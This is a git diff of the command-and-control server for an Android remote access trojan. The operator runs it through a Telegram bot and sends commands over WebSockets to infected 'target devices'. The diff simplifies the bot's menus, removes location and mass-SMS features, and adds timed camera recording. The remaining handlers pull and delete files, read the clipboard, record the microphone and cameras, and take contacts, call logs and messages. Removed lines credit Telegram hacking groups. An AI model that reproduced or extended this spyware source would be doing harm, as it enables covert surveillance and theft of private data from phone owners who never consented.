@@ -366,11 +212,10 @@ appBot.on('message', (message) => {
                 appBot.sendMessage(id, text, {parse_mode: "HTML"})
             }
         }
-        if (message.text == '𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙') {
+        if (message.text == 'Execute') {
             if (appClients.size == 0) {
                 appBot.sendMessage(id,
-                    '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
-                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ\n\n──────────────────────\nᴍᴏᴅɪꜰɪᴇᴅ ʙʏ : @Mr_Alone171\nɢʀᴏᴜᴘ: @Optix_Hunters\nᴄʜᴀɴɴᴇʟ : @Optix_Hunter\n─────────────────────'
+                    'No Connecting Devices',
                 )
             } else {
                 const deviceListKeyboard = []
@@ -380,7 +225,7 @@ appBot.on('message', (message) => {
                         callback_data: 'device:' + key
                     }])
                 })
-                appBot.sendMessage(id, '°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙚𝙣𝙙', {
+                appBot.sendMessage(id, 'Select devices to Execute:', {
                     "reply_markup": {
                         "inline_keyboard": deviceListKeyboard,
                     },
@@ -388,7 +233,7 @@ appBot.on('message', (message) => {
             }
         }
     } else {
-        appBot.sendMessage(id, '°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙')
+        appBot.sendMessage(id, 'Permission Denied')
     }
 })
 appBot.on("callback_query", (callbackQuery) => {
@@ -398,54 +243,42 @@ appBot.on("callback_query", (callbackQuery) => {
     const uuid = data.split(':')[1]
     console.log(uuid)
     if (commend == 'device') {
-        appBot.editMessageText(`°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
+        appBot.editMessageText(`What Execute ? : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
             width: 10000,
             chat_id: id,
             message_id: msg.message_id,
             reply_markup: {
                 inline_keyboard: [
                     [
-                        {text: '𝘼𝙥𝙥𝙨', callback_data: `apps:${uuid}`},
-                        {text: '𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤', callback_data: `device_info:${uuid}`}
+                        {text: 'Apps', callback_data: `apps:${uuid}`},
+                        {text: 'Device Info', callback_data: `device_info:${uuid}`}
                     ],
                     [
-                        {text: '𝙂𝙚𝙩 𝙛𝙞𝙡𝙚', callback_data: `file:${uuid}`},
-                        {text: '𝘿𝙚𝙡𝙚𝙩𝙚 𝙛𝙞𝙡𝙚', callback_data: `delete_file:${uuid}`}
+                        {text: 'Get File', callback_data: `file:${uuid}`},
+                        {text: 'Delete File', callback_data: `delete_file:${uuid}`}
                     ],
                     [
-                        {text: '𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙', callback_data: `clipboard:${uuid}`},
-                        {text: '𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚', callback_data: `microphone:${uuid}`},
+                        {text: 'Clipnoard', callback_data: `clipboard:${uuid}`},
+                        {text: 'Microphone', callback_data: `microphone:${uuid}`},
                     ],
                     [
-                        {text: '𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_main:${uuid}`},
-                        {text: '𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_selfie:${uuid}`}
+                        {text: 'Main Camera', callback_data: `camera_main:${uuid}`},
+                        {text: 'Selfie Camera', callback_data: `camera_selfie:${uuid}`}
                     ],
                     [
-                        {text: '𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `location:${uuid}`},
-                        {text: '𝙏𝙤𝙖𝙨𝙩', callback_data: `toast:${uuid}`}
+                        {text: ' Rec Main Camera', callback_data: `rec_camera_main:${uuid}`},
+                        {text: 'Rec Selfie Camera', callback_data: `rec_camera_selfie:${uuid}`}
+                    ],                  
+                    [
+                        {text: 'Calls', callback_data: `calls:${uuid}`},
+                        {text: 'Contacts', callback_data: `contacts:${uuid}`}
                     ],
                     [
-                        {text: '𝘾𝙖𝙡𝙡𝙨', callback_data: `calls:${uuid}`},
-                        {text: '𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨', callback_data: `contacts:${uuid}`}
-                    ],
-                    [
-                        {text: '𝙑𝙞𝙗𝙧𝙖𝙩𝙚', callback_data: `vibrate:${uuid}`},
-                        {text: '𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `show_notification:${uuid}`}
-                    ],
-                    [
-                        {text: '𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨', callback_data: `messages:${uuid}`},
-                        {text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚', callback_data: `send_message:${uuid}`}
-                    ],
-                    [
-                        {text: '𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤', callback_data: `play_audio:${uuid}`},
-                        {text: '𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤', callback_data: `stop_audio:${uuid}`},
-                    ],
-                    [
-                        {
-                            text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨',
-                            callback_data: `send_message_to_all:${uuid}`
-                        }
-                    ],
+                        {text: 'Vibrate', callback_data: `vibrate:${uuid}`},
+                        {text: 'Messages', callback_data: `messages:${uuid}`},
+                      
+                    ]
+
                 ]
             },
             parse_mode: "HTML"
@@ -459,12 +292,11 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
+            'Processing...',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                    "keyboard": [["Device"], ["Execute"]],
                     'resize_keyboard': true
                 }
             }
@@ -478,12 +310,11 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
+            'Processing...',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                    "keyboard": [["Device"], ["Execute"]],
                     'resize_keyboard': true
                 }
             }
@@ -497,12 +328,11 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
+            'Processing...',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                    "keyboard": [["Device"], ["Execute"]],
                     'resize_keyboard': true
                 }
             }
@@ -516,12 +346,11 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
+            'Processing...',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                    "keyboard": [["Device"], ["Execute"]],
                     'resize_keyboard': true
                 }
             }
@@ -535,12 +364,11 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
+            'Processing...',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                    "keyboard": [["Device"], ["Execute"]],
                     'resize_keyboard': true
                 }
             }
@@ -554,12 +382,11 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
+            'Processing...',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                    "keyboard": [["Device"], ["Execute"]],
                     'resize_keyboard': true
                 }
             }
@@ -573,17 +400,17 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
+            'Processing...',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                    "keyboard": [["Device"], ["Execute"]],
                     'resize_keyboard': true
                 }
             }
         )
     }
+  
     if (commend == 'camera_selfie') {
         appSocket.clients.forEach(function each(ws) {
             if (ws.uuid == uuid) {
@@ -592,36 +419,34 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
+            'Processing...',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                    "keyboard": [["Device"], ["Execute"]],
                     'resize_keyboard': true
                 }
             }
         )
     }
-    if (commend == 'location') {
-        appSocket.clients.forEach(function each(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('location');
-            }
-        });
+    if (commend == 'rec_camera_main') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-            {
-                parse_mode: "HTML",
-                "reply_markup": {
-                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙??𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                    'resize_keyboard': true
-                }
-            }
+            'Enter duration camera main\n\n' +
+            'Example: <b>20</b> Seconds',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
+        currentUuid = uuid
     }
+    if (commend == 'rec_camera_selfie') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            'Enter duration camera selfie\n\n' +
+            'Example: <b>20</b> Seconds',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
+        )
+        currentUuid = uuid
+    }  
     if (commend == 'vibrate') {
         appSocket.clients.forEach(function each(ws) {
             if (ws.uuid == uuid) {
@@ -630,57 +455,22 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
+            'Processing...',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                    "keyboard": [["Device"], ["Execute"]],
                     'resize_keyboard': true
                 }
             }
         )
     }
-    if (commend == 'stop_audio') {
-        appSocket.clients.forEach(function each(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('stop_audio');
-            }
-        });
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-            {
-                parse_mode: "HTML",
-                "reply_markup": {
-                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                    'resize_keyboard': true
-                }
-            }
-        )
-    }
-    if (commend == 'send_message') {
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id, '°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎\n\n' +
-            '•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ',
-            {reply_markup: {force_reply: true}})
-        currentUuid = uuid
-    }
-    if (commend == 'send_message_to_all') {
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨\n\n' +
-            '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
-            {reply_markup: {force_reply: true}}
-        )
-        currentUuid = uuid
-    }
+
     if (commend == 'file') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙\n\n' +
-            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
+            'Enter path file to download\n\n' +
+            'Example : <b> DCIM/Camera </b>.',
             {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
         currentUuid = uuid
@@ -688,8 +478,8 @@ appBot.on("callback_query", (callbackQuery) => {
     if (commend == 'delete_file') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚\n\n' +
-            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ᴅᴇʟᴇᴛᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
+            'Enter path file to delete\n\n' +
+            'Example : <b> DCIM/Camera </b>.',
             {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
         currentUuid = uuid
@@ -697,39 +487,13 @@ appBot.on("callback_query", (callbackQuery) => {
     if (commend == 'microphone') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n' +
-            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ',
+            'Enter duration microphone\n\n' +
+            'Example: <b>20</b> Seconds',
             {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
         currentUuid = uuid
     }
-    if (commend == 'toast') {
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚\n\n' +
-            '• ᴛᴏᴀꜱᴛ ɪꜱ ᴀ ꜱʜᴏʀᴛ ᴍᴇꜱꜱᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀꜱ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ ꜱᴄʀᴇᴇɴ ꜰᴏʀ ᴀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅꜱ',
-            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
-        )
-        currentUuid = uuid
-    }
-    if (commend == 'show_notification') {
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
-            '• ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜꜱ ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ',
-            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
-        )
-        currentUuid = uuid
-    }
-    if (commend == 'play_audio') {
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮\n\n' +
-            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏꜰ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴅ',
-            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
-        )
-        currentUuid = uuid
-    }
+
 });
 setInterval(function () {
     appSocket.clients.forEach(function each(ws) {
